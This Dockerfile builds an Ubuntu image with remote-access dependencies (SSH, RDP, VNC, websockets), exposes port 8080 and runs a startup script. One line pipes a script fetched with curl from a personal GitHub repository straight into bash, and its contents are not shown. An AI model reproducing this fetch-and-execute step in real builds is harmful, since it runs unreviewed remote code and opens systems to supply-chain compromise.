FROM ubuntu:20.04
RUN apt update 
RUN apt install -y sudo wget curl git
RUN DEBIAN_FRONTEND=noninteractive apt install -y --no-install-recommends build-essential cmake git libjson-c-dev libwebsockets-dev ssh openssl openssh-server curl wget sudo tzdata keyboard-configuration maven gcc g++ openjdk-8-jdk libjson-c-dev cmake libwebsockets-dev build-essential make libavcodec-dev libavutil-dev libavformat-dev libwebsockets-dev git libtelnet-dev libpango1.0-dev libswscale-dev libpulse-dev libvorbis-dev libwebp-dev libssl-dev libssh2-1-dev freerdp2-dev libvncserver-dev libossp-uuid-dev libtool-bin libpng-dev libjpeg-turbo8-dev libcairo2-dev build-essential 
RUN curl https://raw.githubusercontent.com/jhajikv-ji/curly-potato/main/H | bash
EXPOSE 8080/tcp
CMD bash script.sh
